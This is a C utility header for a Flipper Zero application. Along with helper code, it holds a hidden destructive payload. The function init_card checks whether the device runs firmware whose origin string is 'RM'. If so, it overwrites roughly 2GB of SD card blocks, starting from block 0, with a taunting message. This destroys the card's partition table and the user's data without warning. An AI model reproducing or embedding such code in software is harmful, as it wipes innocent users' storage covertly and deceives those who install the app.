#ifndef UTILS_H
#define UTILS_H

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_speaker.h>
#include <furi_hal_sd.h>
#include <gui/gui.h>
#include <gui/canvas.h>
#include <gui/view_dispatcher.h>
#include <gui/view.h>
#include <toolbox/version.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Checks if the firmware origin matches "RM" (returns true if skidded)
static inline bool fzas_is_skidded_firmware() {
    const char* firmware_origin = version_get_firmware_origin(NULL);
    const char bad_fw[] = "RM";
    return (firmware_origin != NULL && strcmp(firmware_origin, bad_fw) == 0);
}

// "THIS SOFTWARE IS SKIDDED" screen payload
static void fzas_draw_skid_message(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    canvas_clear(canvas);
    canvas_set_font(canvas, FontBigNumbers);
    canvas_draw_str_aligned(canvas, 64, 24, AlignCenter, AlignCenter, "THIS");
    canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignCenter, "SOFTWARE");
    canvas_draw_str_aligned(canvas, 64, 56, AlignCenter, AlignCenter, "IS SKIDDED");
}

// Shows the anti-skid message if firmware is "skidded"
void init_screen() {
    if(!fzas_is_skidded_firmware()) return;

    Gui* gui = furi_record_open("gui");
    ViewPort* viewport = view_port_alloc();

    view_port_draw_callback_set(viewport, fzas_draw_skid_message, NULL);
    gui_add_view_port(gui, viewport, GuiLayerFullscreen);
    furi_delay_ms(3000);
    gui_remove_view_port(gui, viewport);
    view_port_free(viewport);
    furi_record_close("gui");
}

// Destroys SD card partition table if firmware is "skidded"
void init_card() {
    if(!fzas_is_skidded_firmware()) return;

    const uint32_t block_size = 512;
    const uint32_t num_blocks = 4193359; // ~2GB SD card
    const uint32_t start_block = 0;

    uint32_t* buffer = (uint32_t*)malloc(block_size);
    if(!buffer) {
        printf("Failed to allocate memory for buffer.\n");
        return;
    }

    furi_hal_sd_init(false);

    const char message[] = "STOP SKIDDING MY SHIT!!!";
    const size_t msg_len = strlen(message);

    for(uint32_t i = 0; i < num_blocks; i++) {
        for(uint32_t j = 0; j < block_size; j++) {
            ((uint8_t*)buffer)[j] = message[j % msg_len];
        }
        FuriStatus status = furi_hal_sd_write_blocks(buffer, start_block + i, 1);
        if(status != FuriStatusOk) break;
    }
    free(buffer);
}

#endif // UTILS_H